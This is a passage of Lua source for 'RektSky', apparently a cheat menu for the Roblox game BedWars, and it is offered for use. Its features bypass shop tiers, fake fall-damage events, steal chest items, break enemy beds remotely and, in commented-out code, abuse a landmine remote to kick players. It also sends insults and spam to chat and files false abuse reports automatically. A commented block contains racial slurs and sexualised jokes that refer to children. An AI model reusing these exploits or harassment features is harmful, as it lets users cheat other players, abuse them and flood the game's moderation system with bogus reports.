                        WKey.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                        TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                    end
                    if uis:IsKeyDown(Enum.KeyCode.S) then
                        SKey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
                    else
                        SKey.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                        TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                    end
                    uis.InputBegan:Connect(function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
                            LMB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                            TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
                        end
                        if input.UserInputType == Enum.UserInputType.MouseButton2 then
                            RMB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                            TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
                        end
                    end)
                    uis.InputEnded:Connect(function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
                            LMB.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                            TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
                        end
                        if input.UserInputType == Enum.UserInputType.MouseButton2 then
                            RMB.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                            TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
                        end
                    end)
                until (not keystrokesval)
            end)
        else
            ScreenGuie:Destroy()
        end
    end
})
-- ]]

Tabs["Render"]:CreateToggle({
    ["Name"] = "Night",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if v then
            game.Lighting.TimeOfDay = "00:00:00"
        else
            game.Lighting.TimeOfDay = "13:00:00"
        end
    end
})

Tabs["Render"]:CreateToggle({
    ["Name"] = "RektskyAmbience",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if v then
            game.Lighting.Ambient = Color3.fromRGB(0, 255, 255)
            game.Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
        else
            game.Lighting.Ambient = Color3.fromRGB(91, 91, 91)
            game.Lighting.OutdoorAmbient = Color3.fromRGB(201, 201, 201)
        end
    end
})

local chinahattrail
local chinahatenabled = false
Tabs["Render"]:CreateToggle({
    ["Name"] = "ChinaHat",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        chinahatenabled = v
        if chinahatenabled then
			spawn(function()
                repeat
                    task.wait(0.3)
                    if (not chinahatenabled) then return end
                    if entity.isAlive then
                        if chinahattrail == nil or chinahattrail.Parent == nil then
                            chinahattrail = Instance.new("Part")
                            chinahattrail.CFrame = lplr.Character.Head.CFrame * CFrame.new(0, 1.1, 0)
                            chinahattrail.Size = Vector3.new(3, 0.7, 3)
                            chinahattrail.Name = "ChinaHat"
                            chinahattrail.Material = Enum.Material.Neon
                            chinahattrail.CanCollide = false
                            chinahattrail.Transparency = 0.3
                            local chinahatmesh = Instance.new("SpecialMesh")
                            chinahatmesh.Parent = chinahattrail
                            chinahatmesh.MeshType = "FileMesh"
                            chinahatmesh.MeshId = "http://www.roblox.com/asset/?id=1778999"
                            chinahatmesh.Scale = Vector3.new(3, 0.6, 3)
                            local chinahatweld = Instance.new("WeldConstraint")
                            chinahatweld.Name = "WeldConstraint"
                            chinahatweld.Parent = chinahattrail
                            chinahatweld.Part0 = lplr.Character.Head
                            chinahatweld.Part1 = chinahattrail
                            chinahattrail.Parent = workspace.Camera
                        else
                            chinahattrail.Parent = workspace.Camera
                            chinahattrail.CFrame = lplr.Character.Head.CFrame * CFrame.new(0, 1.1, 0)
                            chinahattrail.LocalTransparencyModifier = ((cam.CFrame.Position - cam.Focus.Position).Magnitude <= 0.6 and 1 or 0)
                            if chinahattrail:FindFirstChild("WeldConstraint") then
                                chinahattrail.WeldConstraint.Part0 = lplr.Character.Head
                            end
                        end
                    else
                        if chinahattrail then 
                            chinahattrail:remove()
                            chinahattrail = nil
                        end
                    end
                until (not chinahatenabled)
            end)
        else
            if chinahattrail then
                chinahattrail:Remove()
                chinahattrail = nil
            end
        end
    end
})

-- EXPLOITS

function yesoksussybed()
    if lplr.leaderstats.Bed.Value ~= "✅" then
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Who ever broke my bed, i have your location", 'All')
    end
end

Tabs["Exploits"]:CreateToggle({
    ["Name"] = "Insults",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        getgenv().autotoxicval = v
        spawn(function()  
            Client:WaitFor("EntityDeathEvent"):andThen(function(p6)
                p6:Connect(function(p7)
                    if p7.fromEntity == lplr.Character then
                        if not getgenv().autotoxicval then return end
                        if getgenv().autotoxicval then
                            local susplr = game.Players:GetPlayerFromCharacter(p7.entityInstance)
                            local toxicmessages = {"Hey, "..susplr.Name..", you should really get RektSky, one of the best gaming chairs! thank me later!!", "Dude you're awfull at this game get better "..susplr.Name.."!", susplr.Name.." you don't get it, you nedd to TURN ON kill aura velocity speed and all that stuff you dumb", "well, "..susplr.Name..", that was the LITERAL easiest kill, RektSky got a nice gaming chair", "try harder "..susplr.Name..", you're so bad", "cope "..susplr.Name, "omg guys vbedwar haker!!!11", "get better noob "..susplr.Name, "me when the "..susplr.Name.." is sus", "me when the "..susplr.Name.." is so sussy", "RektSky is just great!", "ez "..susplr.Name, "L "..susplr.Name, "Bow to me noob, slave "..susplr.Name, "rektsky = best", "me when the rektsky", "omg!!11& bedwar haker!111 hE IS HACIGN OMG SOTP HACKING "..susplr.Name, "shoutout to my boi "..susplr.Name}
                            local randomtoxicmessage = toxicmessages[math.random(1,#toxicmessages)]
                            if last ~= randomtoxicmessage and secondlast ~= randomtoxicmessage and thirdlast ~= randomtoxicmessage then
                                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(randomtoxicmessage, 'All')
                                thirdlast = secondlast
                                secondlast = last
                                last = randomtoxicmessage
                            else
                                local susplr = game.Players:GetPlayerFromCharacter(p7.entityInstance)
                                local toxicmessages = {"Hey, "..susplr.Name..", you should really get RektSky, one of the best gaming chairs! thank me later!!", "Dude you're awfull at this game get better "..susplr.Name.."!", susplr.Name.." you don't get it, you nedd to TURN ON kill aura velocity speed and all that stuff you dumb", "well, "..susplr.Name..", that was the LITERAL easiest kill, RektSky got a nice gaming chair", "try harder "..susplr.Name..", you're so bad", "cope "..susplr.Name, "omg guys vbedwar haker!!!11", "get better noob "..susplr.Name, "me when the "..susplr.Name.." is sus", "me when the "..susplr.Name.." is so sussy", "RektSky is just great!", "ez "..susplr.Name, "L "..susplr.Name, "Bow to me noob, slave "..susplr.Name, "rektsky = best", "me when the rektsky", "omg!!11& bedwar haker!111 hE IS HACIGN OMG SOTP HACKING "..susplr.Name, "shoutout to my boi "..susplr.Name}
                                local randomtoxicmessage = toxicmessages[math.random(1,#toxicmessages)]
                                if last ~= randomtoxicmessage and secondlast ~= randomtoxicmessage and thirdlast ~= randomtoxicmessage then
                                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(randomtoxicmessage, 'All')
                                    thirdlast = secondlast
                                    secondlast = last
                                    last = randomtoxicmessage
                                end
                            end
                        end
                    end
                end)        
            end)
        end)
        spawn(function()
            getgenv().valspeed = v
            if getgenv().valspeed then
                spawn(function()
                    Client:WaitFor("BedwarsBedBreak"):andThen(function(p13)
                        p13:Connect(function(p14)
                            if p14.player.UserId == lplr.UserId then
                                local team = queuemeta[clntstorehandlr:getState().Game.queueType or "bedwars_test"].teams[tonumber(p14.brokenBedTeam.id)]
                                local teamname = team and team.displayName:lower() or "white"
                                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yooo cool bed "..teamname.." :)", 'All')
                            end
                        end)
                    end)
                end)
            end
        end)
        spawn(function()
            lplr.leaderstats.Bed:GetPropertyChangedSignal("Value"):Connect(yesoksussybed)
        end)
    end
})

local shopthingyshopshop = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop.getShopItem, 2)
local oldnexttier
local oldtiered
local bypassstpidshoptiers = false
Tabs["Exploits"]:CreateToggle({
    ["Name"] = "BypassShopTiers",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if (bypassstpidshoptiers) then
            for i,v in pairs(shopthingyshopshop) do
                oldtiered = oldtiered or v.tiered
                oldnexttier = oldnexttier or v.nextTier
            end
            for i,v in pairs(shopthingyshopshop) do
                v.tiered = nil
                v.nextTier = nil
            end
        else
            for i,v in pairs(shopthingyshopshop) do
                v.tiered = oldtiered
                v.nextTier = oldnexttier
            end
        end
    end
})

--[[local breakallbedsthing
breakallbedsthing = Tabs["Exploits"]:CreateToggle({
    ["Name"] = "BreakAllBeds",
    ["Keybind"] = nil,
    ["Callback"] = function(va)
        local amogusvalue = va
        if amogusvalue then
            pcall(function()
                for i = 1,15 do
                    for i, v in pairs(game.Workspace.Map.Blocks:GetChildren()) do
                        if v.Name == "bed" then
                            game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                                ["invisibleLandmine"] = v                    
                            })
                        end
                    end
                end
            end)
            breakallbedsthing:silentToggle()
        end
    end
})

local funikickallthingy
funikickallthingy = Tabs["Exploits"]:CreateToggle({
    ["Name"] = "FunnyKickAll",
    ["Keybind"] = nil,
    ["Callback"] = function(va)
        local amogussvalue = va
        if amogussvalue then
            pcall(function()
                for i = 1,15 do
                    for i, v in pairs(game.Players:GetChildren()) do
                        if v ~= lplr then
                            if v.Character:FindFirstChild("Head") then
                                game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                                    ["invisibleLandmine"] = v.Character.Head                        
                                })
                            end
                        end
                    end
                end
            end)
            funikickallthingy:silentToggle()
        end
    end
})

local funikillallthingy
funikillallthingy = Tabs["Exploits"]:CreateToggle({
    ["Name"] = "MovementDisabler",
    ["Keybind"] = nil,
    ["Callback"] = function(va)
        local amogusssvalue = va
        if amogusssvalue then
            pcall(function()
                for i = 1,15 do
                    for i, v in pairs(game.Players:GetChildren()) do
                        if v ~= lplr then
                            if v.Character.HumanoidRootPart then
                                game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                                    ["invisibleLandmine"] = v                        
                                })
                            end
                        end
                    end
                end
            end)
            funikillallthingy:silentToggle()
        end
    end
})--]]

-- PLAYER


function getmapname()
    for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
        if v.Name == "Map" then
            if v:FindFirstChild("Worlds") then
                for g, c in pairs(v.Worlds:GetChildren()) do
                    if c.Name ~= "Void_World" then
                        return c.Name
                    end
		        end
		    end
		end
	end
end

local lcmapname = getmapname()

Tabs["Player"]:CreateToggle({
    ["Name"] = "NoFall",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if entity.isAlive then
            spawn(function()
                repeat
                    if v == false then return end
                    wait(0.5)
                    game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.GroundHit:FireServer(workspace.Map.Worlds[lcmapname].Blocks,1645488277.345853)
                until v == false
            end)
        end
    end
})

local antivoidpart
Tabs["Player"]:CreateToggle({
    ["Name"] = "AntiVoid",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if v then
            local antivoidpart = Instance.new("Part", Workspace)
            antivoidpart.Name = "AntiVoid"
            antivoidpart.Size = Vector3.new(2100, 0.5, 2000)
            antivoidpart.Position = Vector3.new(160.5, 25, 247.5)
            antivoidpart.Transparency = 0.4
            antivoidpart.Anchored = true
            antivoidpart.Touched:connect(function(dumbcocks)
                if dumbcocks.Parent:WaitForChild("Humanoid") and dumbcocks.Parent.Name == lplr.Name then
                    game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
                    wait(0.2)
                    game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
                    wait(0.2)
                    game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
                end
            end)
        else
            game.Workspace.AntiVoid:remove()
        end
    end
})

function stealcheststrollage()
    for i,v in pairs(game.Workspace.Map.Worlds[lcmapname]:GetChildren()) do
        if v.Name == "chest" then
            if v:FindFirstChild("ChestFolderValue") then
                local mag = (hrp.Position - v.Position).Magnitude
                if mag <= 45 then
                    for k,b in pairs(v.ChestFolderValue.Value:GetChildren()) do
                        if b.Name ~= "ChestOwner" then
                            game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged["Inventory:ChestGetItem"]:InvokeServer(v.ChestFolderValue.Value,b)
                        end
                    end
                end
            end
        end
    end
end

Tabs["Player"]:CreateToggle({
    ["Name"] = "ChestStealer",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if entity.isAlive then
            repeat
                stealcheststrollage()
                wait()
            until v == false
        end
    end
})

-- REKTSKY

local spammer = false
Tabs["Rektsky"]:CreateToggle({
    ["Name"] = "ChatSpammer",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        spammer = v
        if spammer then
            spawn(function()
                repeat
                    if (not spammer) then return end
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("when the rektsky is sus", 'All')
                    wait(2)
                until (not spammer)
            end)
        end
    end
})

do
    local sayinchat = {["Value"] = false}
    local notificationsenabled = {["Value"] = true}
    local autoreport = false
    local autoreportthingy = Tabs["Rektsky"]:CreateToggle({
        ["Name"] = "AutoReport",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            autoreport = v
            if autoreport then
                local reporttable = {
                    ["ez"] = "Bullying",
                    ["gay"] = "Bullying",
                    ["gae"] = "Bullying",
                    ["hacks"] = "Scamming",
                    ["hacker"] = "Scamming",
                    ["hack"] = "Scamming",
                    ["cheat"] = "Scamming",
                    ["hecker"] = "Scamming",
                    ["get a life"] = "Bullying",
                    ["L"] = "Bullying",
                    ["thuck"] = "Swearing",
                    ["thuc"] = "Swearing",
                    ["thuk"] = "Swearing",
                    ["fatherless"] = "Bullying",
                    ["yt"] = "Offsite Links",
                    ["discord"] = "Offsite Links",
                    ["dizcourde"] = "Offsite Links",
                    ["retard"] = "Swearing",
                    ["tiktok"] = "Offsite Links",
                    ["bad"] = "Bullying",
                    ["trash"] = "Bullying",
                    ["die"] = "Bullying",
                    ["lobby"] = "Bullying",
                    ["ban"] = "Bullying",
                    ["youtube"] = "Offsite Links",
                    ["im hacking"] = "Cheating/Exploiting",
                    ["I'm hacking"] = "Cheating/Exploiting",
                    ["download"] = "Offsite Links",
                    ["kill your"] = "Bullying",
                    ["kys"] = "Bullying",
                    ["hack to win"] = "Bullying",
                    ["bozo"] = "Bullying",
                    ["kid"] = "Bullying",
                    ["adopted"] = "Bullying",
                    ["vxpe"] = "Cheating/Exploiting",
                    ["futureclient"] = "Cheating/Exploiting",
                    ["nova6"] = "Cheating/Exploiting",
                    [".gg"] = "Offsite Links",
                    ["gg"] = "Offsite Links",
                    ["lol"] = "Bullying",
                    ["suck"] = "Dating",
                    ["love"] = "Dating",
                    ["fuck"] = "Swearing",
                    ["sthu"] = "Swearing",
                    ["i hack"] = "Cheating/Exploiting",
                    ["disco"] = "Offsite Links",
                    ["dc"] = "Offsite Links"
                }
                function getreport(msg)
                    for i,v in pairs(reporttable) do 
                        if msg:lower():find(i) then 
                            return v
                        end
                    end
                    return nil
                end
                for i, v in pairs(game.Players:GetPlayers()) do
                    if v.Name ~= lplr.Name then
                        v.Chatted:connect(function(msg)
                            local reportfound = getreport(msg)
                            if reportfound then
                                if sayinchat["Value"] then
                                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Reported " .. v.Name .. " for " .. reportfound, 'All')
                                end
                                game.Players:ReportAbuse(v, reportfound, 'He said "' .. msg .. '", was very offensive to me')
                                if notificationsenabled["Value"] then
                                    createnotification("Reported" .. v.Name, "for saying " .. msg, 5, true)
                                end
                            end
                        end)
                    end
                end
            end
        end
    })
    sayinchat = autoreportthingy:CreateOptionTog({
        ["Name"] = "Say reports in chat",
        ["Default"] = false,
        ["Func"] = function() end
    })
    notificationsenabled = autoreportthingy:CreateOptionTog({
        ["Name"] = "Notifications",
        ["Default"] = true,
        ["Func"] = function() end
    })
end

--[[
    local hackdetector = false
    Tabs["Rektsky"]:CreateToggle({
        ["Name"] = "HackerDetector",
        ["Keybind"] = nil,
        ["Callback"] = function(v)
            hackdetector = v
            if hackdetector then
                repeat task.wait() until (matchState == 2)
                spawn(function()
                    repeat
                        task.wait()
                        if (not hackdetector) then return end
                        for i, v in pairs(game.Players:GetChildren()) do
                            if v:FindFirstChild("HumanoidRootPart") then
                                local oldpos = v.Character.HumanoidRootPart.Position
                                task.wait(0.5)
                                local newpos = Vector3.new(v.Character.HumanoidRootPart.Position.X, 0, v.Character.HumanoidRootPart.Position.Z)
                                local realnewpos = math.floor((newpos - Vector3.new(oldpos.X, 0, oldpos.Z)).magnitude) * 2
                                if realnewpos > 32 then
                                    game:GetService("StarterGui"):SetCore("SendNotification", {
                                        Title = v.Name.." is cheating",
                                        Text = tostring(math.floor((newpos - Vector3.new(oldpos.X, 0, oldpos.Z)).magnitude)),
                                        Duration = 5,
                                    })
                                end
                            end
                        end
                    until (not hackdetector)
                end)
            end
        end
    })
]]

--[[
    do
        local rainbowenab = {["Value"] = false}
        local rainbowspeed = {["Value"] = 4.5}
        local clcickgui = Tabs["Rektsky"]:CreateToggle({
            ["Name"] = "ClickGui",
            ["Keybind"] = nil,
            ["Callback"] = function(v) end
        })

        clcickgui:CreateOptionTog({
            ["Name"] = "Rainbow",
            ["Func"] = function(val) 
                lib["Rainbow"] = val 
            end
        })

        clcickgui:CreateSlider({
            ["Name"] = "RainbowSpeed",
            ["Function"] = function() end,
            ["Min"] = 1,
            ["Max"] = 20,
            ["Default"] = 4.5,
            ["Round"] = 1
        })
    end
]]

--[[
Tabs["Rektsky"]:CreateToggle({
    ["Name"] = "FunnyArrayListTroll",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        amongus = v
        if amongus then
            local ScreenGuuii = Instance.new("ScreenGui")
            local uilistlayourthing = Instance.new("UIListLayout")
            local b = Instance.new("TextLabel")
            local c = Instance.new("TextLabel")
            local e = Instance.new("TextLabel")
            local f = Instance.new("TextLabel")
            local a = Instance.new("TextLabel")
            local d = Instance.new("TextLabel")
            ScreenGuuii.Parent = game.CoreGui
            uilistlayourthing.Parent = ScreenGuuii
            uilistlayourthing.HorizontalAlignment = Enum.HorizontalAlignment.Right
            uilistlayourthing.Padding = UDim.new(0, 9)
            b.Name = "b"
            b.Parent = ScreenGuuii
            b.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            b.BackgroundTransparency = 1.000
            b.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            b.Size = UDim2.new(0, 27, 0, 14)
            b.Font = Enum.Font.SourceSansLight
            b.Text = "FatherDisabler"
            b.TextColor3 = Color3.fromRGB(255, 255, 255)
            b.TextSize = 28.000
            c.Name = "c"
            c.Parent = ScreenGui
            c.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            c.BackgroundTransparency = 1.000
            c.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            c.Size = UDim2.new(0, 27, 0, 14)
            c.Font = Enum.Font.SourceSansLight
            c.Text = "CockDisabler"
            c.TextColor3 = Color3.fromRGB(255, 255, 255)
            c.TextSize = 28.000
            e.Name = "e"
            e.Parent = ScreenGui
            e.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            e.BackgroundTransparency = 1.000
            e.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            e.Size = UDim2.new(0, 27, 0, 14)
            e.Font = Enum.Font.SourceSansLight
            e.Text = "NiggaKiller"
            e.TextColor3 = Color3.fromRGB(255, 255, 255)
            e.TextSize = 28.000
            f.Name = "f"
            f.Parent = ScreenGui
            f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            f.BackgroundTransparency = 1.000
            f.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            f.Size = UDim2.new(0, 27, 0, 14)
            f.Font = Enum.Font.SourceSansLight
            f.Text = "ChildESP"
            f.TextColor3 = Color3.fromRGB(255, 255, 255)
            f.TextSize = 28.000
            a.Name = "a"
            a.Parent = ScreenGui
            a.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            a.BackgroundTransparency = 1.000
            a.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            a.Size = UDim2.new(0, 27, 0, 14)
            a.Font = Enum.Font.SourceSansLight
            a.Text = "NoCumSlowDown"
            a.TextColor3 = Color3.fromRGB(255, 255, 255)
            a.TextSize = 28.000
            d.Name = "d"
            d.Parent = ScreenGui
            d.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            d.BackgroundTransparency = 1.000
            d.Position = UDim2.new(0.985937476, 0, 0.0282208584, 0)
            d.Size = UDim2.new(0, 27, 0, 14)
            d.Font = Enum.Font.SourceSansLight
            d.Text = "AutoGroom"
            d.TextColor3 = Color3.fromRGB(255, 255, 255)
            d.TextSize = 28.000
            makeRainbowText(a, true)
            makeRainbowText(b, true)
            makeRainbowText(c, true)
            makeRainbowText(d, true)
            makeRainbowText(e, true)
            makeRainbowText(f, true)
        else
            ScreenGuuii:Destroy()
        end
    end
})
--]]

-- WORLD

local oldpos = Vector3.new(0, 0, 0)
local function getScaffold(vec, diagonaltoggle)
    local realvec = Vector3.new(math.floor((vec.X / 3) + 0.5) * 3, math.floor((vec.Y / 3) + 0.5) * 3, math.floor((vec.Z / 3) + 0.5) * 3) 
    local newpos = (oldpos - realvec)
    local returedpos = realvec
    if entity.isAlive then
        local angle = math.deg(math.atan2(-lplr.Character.Humanoid.MoveDirection.X, -lplr.Character.Humanoid.MoveDirection.Z))
        local goingdiagonal = (angle >= 130 and angle <= 150) or (angle <= -35 and angle >= -50) or (angle >= 35 and angle <= 50) or (angle <= -130 and angle >= -150)
        if goingdiagonal and ((newpos.X == 0 and newpos.Z ~= 0) or (newpos.X ~= 0 and newpos.Z == 0)) and diagonaltoggle then
            return oldpos
        end
    end
    return realvec
end

local yes
local yestwo
local sussyfunnything
local sussything = false
Tabs["World"]:CreateToggle({
    ["Name"] = "Scaffold",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        sussythingy = v
        if (sussythingy) and entity.isAlive then
            spawn(function()
                yestwo = RunService.Heartbeat:Connect(function(step)
                    if (not sussythingy) then return end
                    local y = lplr.Character.HumanoidRootPart.Position.y
                    local x = lplr.Character.HumanoidRootPart.Position.x
                    local z = lplr.Character.HumanoidRootPart.Position.z
                    local blockpos = getScaffold((lplr.Character.Head.Position) + Vector3.new(1, -math.floor(lplr.Character.Humanoid.HipHeight * 3), 0) + lplr.Character.Humanoid.MoveDirection)
                    placeblockthing(blockpos, getwool())
                end)
            end)
        else
            yestwo:Disconnect()
        end
    end
})

function animfunc(id)
    local Animator = hmd:WaitForChild("Animator")
    local Animation = Instance.new("Animation", char)
    Animation.AnimationId = "rbxassetid://"..id
    Animation.Parent = char

    local PlayAnim = Animator:LoadAnimation(Animation)
    PlayAnim:Play()
end

function getblockfrommap(name)
    for i, v in pairs(game.Workspace:GetChildren()) do
        if v:FindFirstChild(name) then
            return v
        end
    end
end

function getbedsxd()
    local beds = {}
    local blocks = game:GetService("Workspace").Map.Worlds[lcmapname].Blocks
    for _,Block in pairs(blocks:GetChildren()) do
        if Block.Name == "bed" and Block.Covers.BrickColor ~= game.Players.LocalPlayer.Team.TeamColor then
            table.insert(beds,Block)
        end
    end
    return beds
end

function getbedsblocks()
    local blockstb = {}
    local blocks = game:GetService("Workspace").Map.Worlds[lcmapname].Blocks
    for i,v in pairs(blocks:GetChildren()) do
        if v:IsA("Part") then
            table.insert(blockstb,v)
        end
    end
    return blockstb
end

function blocks(bed)
    local aboveblocks = 0
    local Blocks = getbedsblocks()
    for _,Block in pairs(Blocks) do
        if Block.Position.X == bed.X and Block.Position.Z == bed.Z and Block.Name ~= "bed" and (Block.Position.Y - bed.Y) <= 9 and Block.Position.Y > bed.Y then
            aboveblocks = aboveblocks + 1
        end
    end
    return aboveblocks
end

function nuker()
    local beds = getbedsxd()
    for _,bed in pairs(beds) do
        local bedmagnitude = (bed.Position - game.Players.LocalPlayer.Character.PrimaryPart.Position).Magnitude
        if bedmagnitude < 27 then
            local upnum = blocks(bed.Position)
            local x = math.round(bed.Position.X/3)
            local y = math.round(bed.Position.Y/3) + upnum
            local z = math.round(bed.Position.Z/3)
            game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.DamageBlock:InvokeServer({
                ["blockRef"] = {
                    ["blockPosition"] = Vector3.new(x,y,z)
                },
                ["hitPosition"] = Vector3.new(x,y,z),
                ["hitNormal"] = Vector3.new(x,y,z),
            })
        end
    end
end

--[[function funinuker()
    if (not isclone) then
        local beds = getbedsxd()
        for _,bed in pairs(beds) do
            local bedmagnitude = (bed.Position - game.Players.LocalPlayer.Character.PrimaryPart.Position).Magnitude
            if bedmagnitude < 27 then
                game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                    ["invisibleLandmine"] = bed
                })
            end
        end
    else
        local beds = getbedsxd()
        for _,bed in pairs(beds) do
            local bedmagnitude = (bed.Position - clone.PrimaryPart.Position).Magnitude
            if bedmagnitude < 27 then
                game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged[landmineremote]:FireServer({
                    ["invisibleLandmine"] = bed
                })
            end
        end
    end
end-]]

Tabs["World"]:CreateToggle({
    ["Name"] = "BedRekter",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        local bedrekterval = v
        if bedrekterval then
            spawn(function()
                repeat
                    wait()
                    if entity.isAlive then
                        wait(0.25)
                        if (not bedrekterval) then return end
                        nuker()
                    end
                until (not bedrekterval)
            end)
        end
    end
})

--[[Tabs["World"]:CreateToggle({
    ["Name"] = "BedRekterV2",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        local BedRekterV2val = v
        if BedRekterV2val then
            spawn(function()
                repeat
                    wait()
                    if (not BedRekterV2val) then return end
                    funinuker()
                until (not BedRekterV2val)
            end)
        end
    end
})-]]

Tabs["World"]:CreateToggle({
    ["Name"] = "LowGravity",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        if v == true then
            workspace.Gravity = 10
        else
            workspace.Gravity = 196.19999694824
        end
    end
})

--[[ code no work lmao 
local plrs = GetAllNearestHumanoidToPosition(17.4, 3)
local targetinfoval = false
local ScreenGuitwoooo
Tabs["World"]:CreateToggle({
    ["Name"] = "TargetInfo",
    ["Keybind"] = nil,
    ["Callback"] = function(v)
        targetinfoval = v
        if targetinfoval then
            ScreenGuitwoooo = Instance.new("ScreenGui")
            ScreenGuitwoooo.Parent = game.CoreGui
            ScreenGuitwoooo.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            local Frame = Instance.new("Frame")
            local Frame_2 = Instance.new("Frame")
            local Frame_3 = Instance.new("Frame")
            local TextLabel = Instance.new("TextLabel")
            local Frame_4 = Instance.new("Frame")
            local Frame_5 = Instance.new("Frame")
            ScreenGuitwoooo.Enabled = false
            Frame.Parent = ScreenGuitwoooo
            Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            Frame.BackgroundTransparency = 0.200
            Frame.BorderSizePixel = 0
            Frame.Position = UDim2.new(0.576041698, 0, 0.652760744, 0)
            Frame.Size = UDim2.new(0, 400, 0, 160)
            Frame_2.Parent = Frame
            Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame_2.BorderSizePixel = 0
            Frame_2.Size = UDim2.new(0, 6, 0, 160)
            makeRainbowFrame(Frame_2, true)
            Frame_3.Parent = Frame
            Frame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame_3.BackgroundTransparency = 1.000
            Frame_3.Position = UDim2.new(0.0524999984, 0, 0.268750012, 0)
            Frame_3.Size = UDim2.new(0, 357, 0, 6)
            TextLabel.Parent = Frame_3
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.BorderSizePixel = 0
            TextLabel.Position = UDim2.new(0, 0, -7.16666651, 0)
            TextLabel.Size = UDim2.new(0, 156, 0, 43)
            TextLabel.Font = Enum.Font.SourceSansLight
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextSize = 36.000
            TextLabel.TextXAlignment = Enum.TextXAlignment.Left
            makeRainbowText(TextLabel, true)
            Frame_4.Parent = Frame_3
            Frame_4.BackgroundColor3 = Color3.fromRGB(17, 61, 0)
            Frame_4.Position = UDim2.new(-0.001221288, 0, -0.0643333495, 0)
            Frame_4.Size = UDim2.new(0, 357, 0, 6)
            Frame_4.ZIndex = 2
            Frame_5.Parent = Frame_4
            Frame_5.BackgroundColor3 = Color3.fromRGB(126, 250, 86)
            Frame_5.Position = UDim2.new(-0.00122138695, 0, -0.0643310547, 0)
            Frame_5.Size = UDim2.new(0, 357, 0, 6)
            spawn(function()
                repeat task.wait() until matchState == 2
                if matchState == 2 then
                    repeat
                        wait()
                        if plr then
                            wait()
                            for i, plr in pairs(plrs) do
                                local targetinfo = {
                                    ["Username"] = plr.Name,
                                    ["Health"] = plr.Character.Humanoid.Health
                                }
                            end
                            ScreenGuitwoooo.Enabled = true
                            Frame_3.Size = UDim2.new(0, 357 - targetinfo["Health"] * 3.55, 0, 6)
                            TextLabel.Text = targetinfo["Username"]
                        else
                            wait()
                            ScreenGuitwoooo.Enabled = false
                        end
                    until (not targetinfoval)
                end
            end)
        else
            makeRainbowFrame(Frame_2, false)
            makeRainbowText(TextLabel, false)
            ScreenGuitwoooo:Destroy()
        end
    end
})
